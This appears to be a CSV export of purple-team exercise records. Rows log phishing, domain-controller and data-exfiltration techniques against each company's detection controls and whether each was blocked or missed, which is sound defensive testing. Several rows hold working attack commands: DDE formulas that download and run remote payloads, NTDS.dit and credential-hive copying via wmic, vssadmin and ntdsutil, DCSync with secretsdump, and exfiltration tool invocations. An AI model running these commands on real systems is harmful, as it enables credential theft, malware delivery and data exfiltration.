Enterprise Purple – 2017 Q3,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over SSH/SCP/SFTP protocol,T1048,,Exfil data using common network protocols,Completed,NotDetected,TBD,TBD,Yes,,,,,Firewall,,2017-08-21T04:26:32.460Z,1503289592460,2017-08-21T05:16:35.460Z,1503292595460,2017-08-21T06:26:04.460Z,1503296764460,Security Risk Advisors,,Extract data from the network over HTTP tcp/22 to external host or IP.,"# FTP Server
./Egress-Assess.py --server sftp --username <username> --password <password>

# FTP Client
Invoke-EgressAssess -Client SFTP -IP <IP or Domain> -Datatype <Data Type> -Size 20 -Loops 5 -Fast -Verbose -NoPing -Username <username> -Password <password>",,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2017 Q3,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over FTP protocol,T1048,,Exfil data using common network protocols,Completed,Blocked,TBD,No,TBD,,1) Sensitive data sent over common network protocol is detected by proxy or DLP tool,,,"DLP,Firewall",Gunhed,2017-08-21T02:07:33.460Z,1503281253460,2017-08-21T03:07:37.460Z,1503284857460,2017-08-21T03:20:10.460Z,1503285610460,Security Risk Advisors,,Extract data from the network over HTTP tcp/21 to external host or IP.,,,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,8 - Link - Macro - MMG WMI PowerShell,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-08T14:58:18.460Z,1502204298460,2017-08-08T14:59:50.460Z,1502204390460,2017-08-08T16:22:35.460Z,1502209355460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,5 - Link - Macro - WScript PowerShell,T1566.002,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-08T07:14:18.460Z,1502176458460,2017-08-08T08:45:45.460Z,1502181945460,2017-08-08T09:34:12.460Z,1502184852460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,10 - Link - Macro - MSBuild,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-08T19:53:42.460Z,1502222022460,2017-08-08T21:25:18.460Z,1502227518460,2017-08-08T23:20:16.460Z,1502234416460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,21 - Link - Link Inside PDF,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-10T03:25:24.460Z,1502335524460,2017-08-10T04:29:43.460Z,1502339383460,2017-08-10T05:52:23.460Z,1502344343460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Create a PDF with a malicious link in it and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,3 - Link - Macro - Cobalt Strike Standard as HREF (URL Rewrite Update),T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-08T01:51:59.460Z,1502157119460,2017-08-08T01:52:57.460Z,1502157177460,2017-08-08T02:56:32.460Z,1502160992460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,19 - Link - Encrypted Archive - DDE,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-09T23:07:02.460Z,1502320022460,2017-08-09T23:08:03.460Z,1502320083460,2017-08-10T00:13:35.460Z,1502324015460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip and encrypt the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,22 - Link - Link Inside Office Document,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-10T06:34:27.460Z,1502346867460,2017-08-10T08:07:14.460Z,1502352434460,2017-08-10T09:57:53.460Z,1502359073460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Send a office document with a malicious link in it,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,2 - Link - Macro - CobaltStrike Standard (MMG),T1566.002,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-07T22:29:50.460Z,1502144990460,2017-08-08T00:19:09.460Z,1502151549460,2017-08-08T00:52:15.460Z,1502153535460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,16 - Link - Archive - DDE,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-09T16:00:02.460Z,1502294402460,2017-08-09T16:45:41.460Z,1502297141460,2017-08-09T18:14:17.460Z,1502302457460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,13 - Link - DDE - Exe,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-09T07:27:45.460Z,1502263665460,2017-08-09T09:20:48.460Z,1502270448460,2017-08-09T10:38:40.460Z,1502275120460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,6 - Link - Macro - WScript EXE,T1566.002,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-08T10:45:37.460Z,1502189137460,2017-08-08T12:01:47.460Z,1502193707460,2017-08-08T13:18:01.460Z,1502198281460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,9 - Link - Macro - LuckyStrike PowerShell CellEmbed,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-08T17:02:31.460Z,1502211751460,2017-08-08T17:22:34.460Z,1502212954460,2017-08-08T18:34:40.460Z,1502217280460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,1 - Link - Macro - Cobalt Strike Standard,T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-07T19:15:13.460Z,1502133313460,2017-08-07T20:22:25.460Z,1502137345460,2017-08-07T20:53:38.460Z,1502139218460,Security Risk Advisors,,Send phishing email to victim containing link with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Attacks --> Packages --> MS Office Macro
Copy code to office document",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,20 - Link - Password-protected Office Doc - Standard CS payload,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-10T00:17:43.460Z,1502324263460,2017-08-10T02:03:28.460Z,1502330608460,2017-08-10T02:13:32.460Z,1502331212460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Generate standard office payload using cobalt strike from Attacks -> Packages -> MS Office Macro

When saving the malicious macro, encrypt the document with a password by: Save -> Info -> Protect Document -> Encrypt With Password",,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,11 - Link - DDE - PowerShell,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-09T00:09:19.460Z,1502237359460,2017-08-09T00:59:30.460Z,1502240370460,2017-08-09T01:53:40.460Z,1502243620460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,7 - Link - Macro - WScript PowerShell XOR,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-08T13:20:50.460Z,1502198450460,2017-08-08T13:37:37.460Z,1502199457460,2017-08-08T14:50:52.460Z,1502203852460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,4 - Link - Macro - Cobalt Strike Standard (URL Rewrite Update),T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-08T04:54:57.460Z,1502168097460,2017-08-08T04:58:31.460Z,1502168311460,2017-08-08T05:37:03.460Z,1502170623460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,14 - Link - Macro - Remote Template,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-09T12:02:57.460Z,1502280177460,2017-08-09T13:14:41.460Z,1502284481460,2017-08-09T14:32:44.460Z,1502289164460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,15 - Link - Archive - Macro,T1566.002,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-09T02:32:29.460Z,1502245949460,2017-08-09T02:37:10.460Z,1502246230460,2017-08-09T03:40:04.460Z,1502250004460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar malicious document and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,17 - Link - Macro - LuckyStrike PowerShell CellEmbed + Sandbox Evasion,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-09T19:37:39.460Z,1502307459460,2017-08-09T19:57:10.460Z,1502308630460,2017-08-09T21:11:02.460Z,1502313062460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,18 - Link - Encrypted Archive - Macro,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-09T21:47:19.460Z,1502315239460,2017-08-09T22:27:32.460Z,1502317652460,2017-08-09T23:01:19.460Z,1502319679460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar and encrypt malicious document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email with Malicious Links,Delivery,12 - Link - Macro - MMG WMI Exe,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-09T03:45:06.460Z,1502250306460,2017-08-09T04:17:14.460Z,1502252234460,2017-08-09T06:00:59.460Z,1502258459460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Domain Controller Assault,Lateral Movement,Extract password hashes from DC by copying NTDS.dit,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR,Endpoint Protection",,2018-01-18T16:53:19.130Z,1516294399130,2018-01-18T17:07:57.130Z,1516295277130,2018-01-18T18:32:31.130Z,1516300351130,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller.,"wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\NTDS\ ntds.dit C:\Temp\NTDS.dit 2>&1 > C:\Temp\output.txt""",,Medium,High,Internal,Medium,,,,SMBexec
Enterprise Purple – 2018 Q1,Domain Controller Assault,Command & Control,Beacon SMB payload on a DC,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,No,,1) C2 beacon from DC is detected and blocked by EDR or network behavioral analysis tool,,,"EDR,Behavior Analytics",,2018-01-18T20:18:19.130Z,1516306699130,2018-01-18T21:58:33.130Z,1516312713130,2018-01-18T23:18:12.130Z,1516317492130,Security Risk Advisors,,"Establish an command-and-control beacon from a compromised DC, to other staging hosts on the internal network and potentially direct outbound connection to an external system.",Generate SMB beacon and run on DC,,Low,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Domain Controller Assault,Lateral Movement,Extract Password Hashes via VSS,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2018-01-19T08:44:54.130Z,1516351494130,2018-01-19T09:43:43.130Z,1516355023130,2018-01-19T11:25:29.130Z,1516361129130,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller via VSS (Volume Shadow Services).,"wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c vssadmin list shadows 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c vssadmin create shadow /for=C: 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\Temp\SYSTEM.hive 2>&1 > C:\Temp\output.txt""
wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\NTDS\ ntds.dit C:\Temp\NTDS.dit 2>&1 > C:\Temp\output.txt""",,Medium,High,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Domain Controller Assault,Command & Control,Beacon HTTP payload on a DC,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,No,,1) C2 beacon from DC is detected and blocked by EDR or network behavioral analysis tool,,,"EDR,Behavior Analytics",,2018-01-18T23:56:58.130Z,1516319818130,2018-01-19T00:35:34.130Z,1516322134130,2018-01-19T00:51:38.130Z,1516323098130,Security Risk Advisors,,"Establish an command-and-control beacon from a compromised DC, to other staging hosts on the internal network and potentially direct outbound connection to an external system.",Start http listener and generate a payload from Attacks -> Packages,,Low,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Domain Controller Assault,Lateral Movement,Extract Password Hashes via NTDSUtil,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2018-01-19T01:35:25.130Z,1516325725130,2018-01-19T03:11:24.130Z,1516331484130,2018-01-19T04:58:43.130Z,1516337923130,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller via NTDSUtils.,ntdsutil “ac in ntds” “ifm” “cr fu \\yourip\tmp” q q,,Medium,High,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Domain Controller Assault,Lateral Movement,Extract password hashes from DC using DC replication / DCSync,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR",,2018-01-19T05:49:46.130Z,1516340986130,2018-01-19T05:52:02.130Z,1516341122130,2018-01-19T07:18:41.130Z,1516346321130,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller.,"Using impacket:
python secretsdump.py -just-dc DOMAIN/USER:PASSWORD@<DC IP>",,Medium,High,Internal,High,,,,
Enterprise Purple – 2018 Q1,Domain Controller Assault,Lateral Movement,Interactive Logon to a DC,T1078,,Compromise a DC,Completed,NotDetected,TBD,TBD,Yes,,"1) SIEM rules are configured to detect unusual logons to DCs from domain admin users and service accounts, potential detection of anomalous system access from UEBA tool",,,"SIEM,Behavior Analytics",,2018-01-18T13:07:21.130Z,1516280841130,2018-01-18T14:40:14.130Z,1516286414130,2018-01-18T16:30:11.130Z,1516293011130,Security Risk Advisors,,Perform anomalous interactive logons to a DC from privileged user and service accounts.  Once logged in establish persistent remote shell.,Use RDP to access DC and set up persistence,,Medium,High,Internal,Low,,,,
Enterprise Purple – 2018 Q1,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over SSH/SCP/SFTP protocol,T1048,,Exfil data using common network protocols,Completed,Blocked,TBD,No,Yes,,,,,Firewall,MUSHA,2018-01-20T23:44:18.130Z,1516491858130,2018-01-21T01:01:32.130Z,1516496492130,2019-01-28T17:36:07.055Z,1548696967055,Security Risk Advisors,,Extract data from the network over HTTP tcp/22 to external host or IP.,"# FTP Server
./Egress-Assess.py --server sftp --username <username> --password <password>

# FTP Client
Invoke-EgressAssess -Client SFTP -IP <IP or Domain> -Datatype <Data Type> -Size 20 -Loops 5 -Fast -Verbose -NoPing -Username <username> -Password <password>",,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2018 Q1,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over FTP protocol,T1048,,Exfil data using common network protocols,Completed,Blocked,TBD,No,TBD,,1) Sensitive data sent over common network protocol is detected by proxy or DLP tool,,,"DLP,Firewall",MUSHA,2018-01-20T20:53:13.130Z,1516481593130,2018-01-20T22:01:50.130Z,1516485710130,2018-01-20T23:33:59.130Z,1516491239130,Security Risk Advisors,,Extract data from the network over HTTP tcp/21 to external host or IP.,,,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2018 Q1,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over established HTTPS C2,T1041,,Exfil data using common network protocols,Completed,NotDetected,TBD,TBD,No,,1) HTTPS / SSL/TLS decryption is enabled in proxy or firewall appliances,,,"Web Gateway,Firewall",,2018-01-21T04:42:17.130Z,1516509737130,2018-01-21T05:11:29.130Z,1516511489130,2018-01-21T05:17:59.130Z,1516511879130,Security Risk Advisors,,Extract data from the network over HTTP tcp/443 to external host or IP.,"# HTTPS Server
./Egress-Assess.py --server https

# HTTPS Client
Invoke-EgressAssess -Client HTTPS -IP <IP or Domain> -Datatype <Data Type> -Size 20 -Loops 5 -Fast -Verbose -NoPing",,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2018 Q1,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over established HTTP C2,T1041,,Exfil data using common network protocols,Completed,NotDetected,High,TBD,No,,,,,"Web Gateway,DLP,Firewall",,2018-01-21T02:15:09.130Z,1516500909130,2018-01-21T02:55:33.130Z,1516503333130,2019-01-28T19:13:41.236Z,1548702821236,Security Risk Advisors,,Extract data from the network over HTTP tcp/80 to external host or IP.,,,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2018 Q1,Data Exfil Methods - Email and USB,Exfiltration,Extract data via encrypted zip or rar file via email,T1560,,Exfil data using email,Completed,NotDetected,TBD,TBD,Yes,,,,,"Email Gateway,DLP",,2018-01-20T16:24:35.130Z,1516465475130,2018-01-20T16:34:00.130Z,1516466040130,2018-01-20T17:27:00.130Z,1516469220130,Security Risk Advisors,,"Send encrypted zip or rar using Outlook, Gmail, or other popular mail program.",Zip or rar sensitive data and send that file using email to an external email address.,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Data Exfil Methods - Email and USB,Exfiltration,Extract data via unencrypted zip or rar file via email,T1560,,Exfil data using email,Completed,Detected,High,TBD,Yes,,,,,"Email Gateway,DLP",Spriggan,2018-01-20T14:06:26.130Z,1516457186130,2018-01-20T15:24:15.130Z,1516461855130,2019-01-28T17:42:05.669Z,1548697325669,Security Risk Advisors,,"Send encrypted zip or rar using Outlook, Gmail, or other popular mail program.",Zip or rar sensitive data and send that file to external email.,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Data Exfil Methods - Email and USB,Exfiltration,Extract data using popular sites,T1048,,Exfil data using popular websites,Completed,Blocked,TBD,No,No,,"1) Connections to popular online sites/cloud storage blocked by the proxy or firewall.,2) Attempts to exfil sensitive data over HTTP and HTTPS is detected in-line by DLP tools",,,"Web Gateway,DLP",MUSHA,2018-01-20T08:23:45.130Z,1516436625130,2018-01-20T09:33:36.130Z,1516440816130,2019-01-28T17:42:30.377Z,1548697350377,Security Risk Advisors,,Extract data from the network using popular websites and cloud storage services.,,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Data Exfil Methods - Email and USB,Exfiltration,Extract data via an unencrypted zip or rar file on USB Drive,T1052,,Exfil data with USB drive,Completed,Blocked,TBD,Yes,TBD,,,,,"DLP,Secure Baselines",Spriggan,2018-01-20T03:24:01.130Z,1516418641130,2018-01-20T03:26:29.130Z,1516418789130,2018-01-20T04:36:45.130Z,1516423005130,Security Risk Advisors,,Put unencrypted zip on USB drive,,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Data Exfil Methods - Email and USB,Exfiltration,Extract data via encrypted zip or rar file on USB Drive,T1052,,Exfil data with USB drive,Completed,Blocked,TBD,Yes,TBD,,,,,"DLP,Secure Baselines",Spriggan,2018-01-20T04:47:24.130Z,1516423644130,2018-01-20T06:27:24.130Z,1516429644130,2018-01-20T06:33:32.130Z,1516430012130,Security Risk Advisors,,"Put encrypted zip or rar on USB drive, using AES encryption or other format.",,,High,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Data Exfil Methods - Email and USB,Exfiltration,"Email sensitive data to external recipient using automated script (PII, PHI, others)",T1020,,Exfil data using email,Completed,Detected,High,TBD,TBD,,,,,DLP,Spriggan,2018-01-20T17:33:35.130Z,1516469615130,2018-01-20T18:57:04.130Z,1516474624130,2018-01-20T20:47:37.130Z,1516481257130,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Send an email with sensitive data in the body.,,Medium,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2018 Q1,Data Exfil Methods - Email and USB,Exfiltration,Email sensitive document to external recipient - Names and DOBs,T1048,,Exfil data using email,Completed,NotDetected,High,TBD,No,,,,,DLP,,2018-01-20T10:35:45.130Z,1516444545130,2018-01-20T11:47:08.130Z,1516448828130,2019-01-29T08:11:47.932Z,1548749507932,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Compose email with Names and DOB's and send to an external recipient.,,Medium,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Data Exfil Methods - Email and USB,Exfiltration,Suspicious use of makecab,,,Data compression,Completed,NotDetected,TBD,TBD,No,,1) Suspicious use of makecab is detected by EDR and/or SIEM tool,,,"SIEM,EDR",,2018-01-20T07:08:28.130Z,1516432108130,2018-01-20T07:11:32.130Z,1516432292130,2018-01-20T08:19:39.130Z,1516436379130,Security Risk Advisors,,Using the built in makecab tool to compress files prior to exfiltration.,"makecab ""important_file.txt"" ""not_important_file.cab"" /L ""C:\Temp""",,Low,Low,Internal,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Data Exfil Methods - Email and USB,Exfiltration,Email sensitive document to external recipient - SSN and CC,T1048,,Exfil data using email,Completed,NotDetected,High,TBD,Yes,,,,,DLP,,2018-01-20T12:49:47.130Z,1516452587130,2018-01-20T12:59:33.130Z,1516453173130,2019-01-29T08:12:04.450Z,1548749524450,Security Risk Advisors,,"Email test data to simulate PII, credit card numbers, PHI, etc. leaving the network over email.",Email an external recipient with an email that contians SSN and CC numbers.,,Medium,High,Both,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,C2 Channels,Command & Control,Cobalt Strike Custom Beacon HTTP payload over tcp/80,T1095,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,Behavior Analytics",,2018-01-12T05:19:00.130Z,1515734340130,2018-01-12T06:47:16.130Z,1515739636130,2018-01-12T07:17:28.130Z,1515741448130,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Create malleable c2 profile

./teamserver [external IP] [password] [/path/to/my.profile]",,Medium,High,Both,Medium,,,,Cobalt Strike
